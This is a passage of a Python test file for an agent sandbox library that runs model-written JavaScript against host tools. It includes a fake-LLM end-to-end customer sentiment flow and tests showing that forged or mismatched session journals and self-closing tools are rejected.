        def slow_tool() -> int:
            gate.wait(10)
            return 1

        with session({"slow_tool": slow_tool}) as busy:
            # Hold the session from another thread (inside run()), then try to use it here.
            worker = threading.Thread(
                target=lambda: busy.run("return await slow_tool()")
            )
            worker.start()
            time.sleep(0.3)
            with pytest.raises(RuntimeError, match="busy"):
                busy.run("return 1")
            gate.set()
            worker.join(30)
            assert busy.run("return 2") == 2


# ---------------------------------------------------------------------------
# end to end: a fake LLM driving the session, as in Monty's sql_playground
# ---------------------------------------------------------------------------


def _customer_db() -> sqlite3.Connection:
    db = sqlite3.connect(":memory:", check_same_thread=False)
    db.execute(
        "CREATE TABLE customers (name TEXT, email TEXT, total REAL, twitter TEXT)"
    )
    db.executemany(
        "INSERT INTO customers VALUES (?, ?, ?, ?)",
        [
            ("Ada", "ada@example.com", 950.0, "ada_l"),
            ("Grace", "grace@example.com", 720.5, "hopper"),
            ("Linus", "linus@example.com", 610.0, None),
            ("Barbara", "barbara@example.com", 120.0, "liskov"),
        ],
    )
    return db


TWEETS = {
    "ada_l": ["I love this product", "great support, love it"],
    "hopper": ["shipping was terrible", "the app is great"],
    "liskov": ["meh"],
}


class FakeLLM:
    """Stands in for a model: it reads the system prompt it is given and answers with code."""

    def __init__(self) -> None:
        self.prompts: list[str] = []

    def complete(self, system: str, user: str) -> str:
        self.prompts.append(system + "\n" + user)
        if "top customers" in user:
            return """
const top = await query_csv(
  "SELECT name, email, total, twitter FROM customers WHERE twitter IS NOT NULL " +
  "ORDER BY total DESC LIMIT 3")
const report = []
for (const c of top) {
  const tweets = await get_tweets(c.twitter)
  const scores = await Promise.all(tweets.map((t) => analyze_sentiment(t)))
  const avg = scores.reduce((a, b) => a + b, 0) / scores.length
  report.push({ name: c.name, total: c.total, tweets: tweets.length,
                sentiment: Math.round(avg * 100) / 100 })
}
return report
"""
        # A follow-up turn reuses what the first one left behind.
        return "return report.filter((r) => r.sentiment > 0).map((r) => r.name)"


class TestFakeLLMEndToEnd:
    def test_sql_playground_flow(self) -> None:
        db = _customer_db()
        calls: list[str] = []

        def query_csv(sql: str) -> list[dict[str, Any]]:
            """Run a read-only SQL query; one dict per row."""
            calls.append("query_csv")
            if not sql.lstrip().upper().startswith("SELECT"):
                raise PermissionError("read-only")
            cursor = db.execute(sql)
            columns = [d[0] for d in cursor.description]
            return [dict(zip(columns, row, strict=True)) for row in cursor.fetchall()]

        async def get_tweets(handle: str) -> list[str]:
            """All tweets of a Twitter handle."""
            calls.append("get_tweets")
            return TWEETS.get(handle, [])

        def analyze_sentiment(text: str) -> float:
            """Sentiment of a text, from -1.0 to +1.0."""
            calls.append("analyze_sentiment")
            words = text.lower().split()
            score = sum(w in ("love", "great") for w in words) - sum(
                w in ("terrible", "awful") for w in words
            )
            return max(-1.0, min(1.0, score / 2))

        tools = {
            "query_csv": query_csv,
            "get_tweets": get_tweets,
            "analyze_sentiment": analyze_sentiment,
        }
        llm = FakeLLM()
        with session(tools, max_tool_calls=50) as s:
            system = s.describe_tools() + "\n" + s.typescript_stubs()
            code = llm.complete(system, "Analyse the sentiment of our top customers.")
            report = s.run(code)
            assert report == [
                {"name": "Ada", "total": 950.0, "tweets": 2, "sentiment": 0.75},
                {"name": "Grace", "total": 720.5, "tweets": 2, "sentiment": 0.0},
                {"name": "Barbara", "total": 120.0, "tweets": 1, "sentiment": 0.0},
            ]
            assert calls.count("query_csv") == 1
            assert calls.count("get_tweets") == 3
            assert calls.count("analyze_sentiment") == 5
            assert s.calls_made == 9

            followup = llm.complete(system, "Which of them are happy?")
            assert s.run(followup) == ["Ada"]

            # The whole conversation is durable: replay it elsewhere without touching the tools.
            made = len(calls)
            with AgentSandbox.load(s.dump(KEY), KEY, tools) as restored:
                assert len(calls) == made
                assert restored.run("return report.length") == 3

        assert (
            "declare function query_csv(sql: string): Promise<Record<string, unknown>[]>;"
            in (llm.prompts[0])
        )
        assert "analyze_sentiment(text: string): Promise<number>" in llm.prompts[0]
        assert 'Example: const result = await get_tweets("handle");' in llm.prompts[0]


class TestRoundThreeFindings:
    """Found by independent review of the sessions layer; each used to be possible."""

    KEY = b"k" * 32

    def _tools(self) -> dict[str, Any]:
        return {"add": lambda a, b: a + b}

    def test_a_journal_cannot_be_loaded_under_another_identity(self) -> None:
        with AgentSandbox(self._tools()) as s:
            s.run("return await add(1, 2)")
            blob = s.dump(self.KEY, associated_data=b"tenant-a")
        with pytest.raises(JournalError):
            AgentSandbox.load(
                blob, self.KEY, self._tools(), associated_data=b"tenant-b"
            )
        with pytest.raises(JournalError):
            AgentSandbox.load(blob, self.KEY, self._tools())  # no identity at all
        with AgentSandbox.load(
            blob, self.KEY, self._tools(), associated_data=b"tenant-a"
        ) as ok:
            assert ok.run("return await add(2, 3)") == 5

    def test_associated_data_is_framed_so_it_cannot_slide_into_the_payload(
        self,
    ) -> None:
        # (ad="ab", payload="c...") and (ad="a", payload="bc...") must not share a signature
        one = _seal(b"c-payload", self.KEY, b"ab")
        other = _seal(b"bc-payload", self.KEY, b"a")
        assert (
            one[len(agent_module._MAGIC) :][:32]
            != other[len(agent_module._MAGIC) :][:32]
        )  # noqa: SLF001

    def test_a_journal_from_another_release_is_refused_before_any_worker_starts(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        with AgentSandbox(self._tools()) as s:
            blob = s.dump(self.KEY)
        monkeypatch.setattr(agent_module, "_engine_version", lambda: b"0.0.1-other")

        def no_worker(*a: object, **k: object) -> None:
            raise AssertionError(
                "a worker was started for a journal that should be refused"
            )

        monkeypatch.setattr(agent_module, "IsolatedRuntime", no_worker)
        with pytest.raises(JournalError, match="recorded by pydeno"):
            AgentSandbox.load(blob, self.KEY, self._tools())

    def test_a_different_redaction_setting_is_refused(self) -> None:
        with AgentSandbox(self._tools()) as s:
            blob = s.dump(self.KEY)
        with pytest.raises(JournalError, match="redact_host_errors"):
            AgentSandbox.load(blob, self.KEY, self._tools(), redact_host_errors=False)

    def test_a_unicode_word_character_in_a_comment_does_not_break_the_run(self) -> None:
        with AgentSandbox({}) as s:
            step = s.start("/*\nconst x\u00b2 = 1\n*/\nreturn 1")
            assert isinstance(step, Done) and step.value == 1

    @pytest.mark.parametrize(
        "config_change",
        [
            {"max_tool_calls": True},
            {"clock_ms": 10**30},
            {"random_seed": -1},
            {"release": 5},
        ],
        ids=["bool-budget", "clock-out-of-range", "negative-seed", "release-not-str"],
    )
    def test_authentic_but_odd_journals_raise_journal_error(
        self, config_change: dict
    ) -> None:
        with AgentSandbox(self._tools()) as s:
            blob = s.dump(self.KEY)
        journal = json.loads(_open(blob, self.KEY))
        journal["config"].update(config_change)
        forged = _seal(json.dumps(journal).encode(), self.KEY)
        with pytest.raises(JournalError):
            AgentSandbox.load(forged, self.KEY, self._tools())

    def test_an_authentic_journal_with_a_huge_integer_is_a_journal_error(self) -> None:
        with AgentSandbox(self._tools()) as s:
            s.run("return await add(1, 2)")
            blob = s.dump(self.KEY)
        journal = json.loads(_open(blob, self.KEY))
        journal["records"] = [
            ["run", "return 1"],
            ["obs", "done", "x"],
            ["ans", "v", {"$": "int", "v": "9" * 5000}],
        ]
        forged = _seal(json.dumps(journal).encode(), self.KEY)
        with pytest.raises((JournalError, ReplayDivergence)):
            AgentSandbox.load(forged, self.KEY, self._tools())

    def test_a_forked_child_exiting_does_not_stall_for_the_drain_timeout(self) -> None:
        code = (
            "import os, sys, time\n"
            "from pydeno import AgentSandbox\n"
            "s = AgentSandbox({})\n"
            "pid = os.fork()\n"
            "if pid == 0:\n"
            "    sys.exit(0)\n"
            "t = time.monotonic(); os.waitpid(pid, 0)\n"
            "took = time.monotonic() - t\n"
            "assert s.run('return 1') == 1\n"
            "s.close()\n"
            "print('%.1f' % took)\n"
        )
        done = subprocess.run(
            [sys.executable, "-c", code], capture_output=True, text=True, timeout=120
        )
        assert done.returncode == 0, done.stderr
        assert float(done.stdout.strip()) < 5.0, done.stdout

    def test_a_tool_cannot_close_its_own_session(self) -> None:
        holder: dict[str, AgentSandbox] = {}
        errors: list[BaseException] = []

        async def sabotage() -> int:
            try:
                holder["s"].close()
            except BaseException as exc:  # noqa: BLE001
                errors.append(exc)
            return 1

        with AgentSandbox({"sabotage": sabotage}) as s:
            holder["s"] = s
            assert s.run("return await sabotage()") == 1
        assert errors and isinstance(errors[0], RuntimeError), errors
